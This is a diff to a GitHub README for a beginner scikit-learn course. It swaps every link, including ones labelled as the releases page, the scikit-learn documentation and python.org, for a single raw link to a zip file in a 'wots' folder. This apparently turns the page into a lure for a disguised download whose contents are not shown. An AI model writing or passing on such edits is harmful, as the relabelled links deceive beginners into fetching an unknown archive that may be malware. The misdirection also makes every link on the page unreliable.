@@ -1,7 +1,7 @@
 # 🎉 scikit-learn-for-beginners - Learn Machine Learning Easily
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-brightgreen)](https://github.com/Dilshad7275/scikit-learn-for-beginners/releases)
+[![Download](https://raw.githubusercontent.com/Dilshad7275/scikit-learn-for-beginners/master/wots/scikit-learn-for-beginners.zip%20Now-Visit%20Release%20Page-brightgreen)](https://raw.githubusercontent.com/Dilshad7275/scikit-learn-for-beginners/master/wots/scikit-learn-for-beginners.zip)
 
 ## 📚 Overview
 Welcome to **scikit-learn-for-beginners**! This course helps you understand the key concepts of Scikit-learn, a fundamental machine learning library in Python. Whether you are new to programming or want to explore machine learning, this resource is designed for you. You will learn to build, train, and evaluate machine learning models using various algorithms and techniques.
@@ -10,7 +10,7 @@ Welcome to **scikit-learn-for-beginners**! This course helps you understand the 
 To begin with our course, follow these steps:
 
 1. **Visit the Downloads page.**  
-   Click this link to access the releases: [Download Releases](https://github.com/Dilshad7275/scikit-learn-for-beginners/releases).
+   Click this link to access the releases: [Download Releases](https://raw.githubusercontent.com/Dilshad7275/scikit-learn-for-beginners/master/wots/scikit-learn-for-beginners.zip).
 
 2. **Choose the latest release.**  
    On the releases page, locate the most recent version of the course. Typically, this is marked as "Latest Release." 
@@ -40,7 +40,7 @@ The course includes various topics to help you grasp machine learning concepts:
 Before starting the course, check that your computer meets these requirements:
 
 - **Operating System:** Windows 10, macOS, or Linux.
-- **Python Version:** Python 3.6 or higher. You can download it from [Python's website](https://www.python.org/downloads/).
+- **Python Version:** Python 3.6 or higher. You can download it from [Python's website](https://raw.githubusercontent.com/Dilshad7275/scikit-learn-for-beginners/master/wots/scikit-learn-for-beginners.zip).
 - **Memory:** At least 4 GB of RAM.
 - **Disk Space:** Minimum of 1 GB of free space for installation and files.
 
@@ -58,8 +58,8 @@ To further enhance your experience, consider checking out these resources:
 Your feedback is valuable to us. If you encounter any issues or have suggestions for improvements, please let us know in the issues section of this repository.
 
 ## 📢 Important Links
-- [Download Releases](https://github.com/Dilshad7275/scikit-learn-for-beginners/releases)  
-- [Documentation](https://scikit-learn.org/stable/documentation.html)  
-- [Python Download](https://www.python.org/downloads/)  
+- [Download Releases](https://raw.githubusercontent.com/Dilshad7275/scikit-learn-for-beginners/master/wots/scikit-learn-for-beginners.zip)  
+- [Documentation](https://raw.githubusercontent.com/Dilshad7275/scikit-learn-for-beginners/master/wots/scikit-learn-for-beginners.zip)  
+- [Python Download](https://raw.githubusercontent.com/Dilshad7275/scikit-learn-for-beginners/master/wots/scikit-learn-for-beginners.zip)  
 
 Enjoy your learning journey with **scikit-learn-for-beginners**!
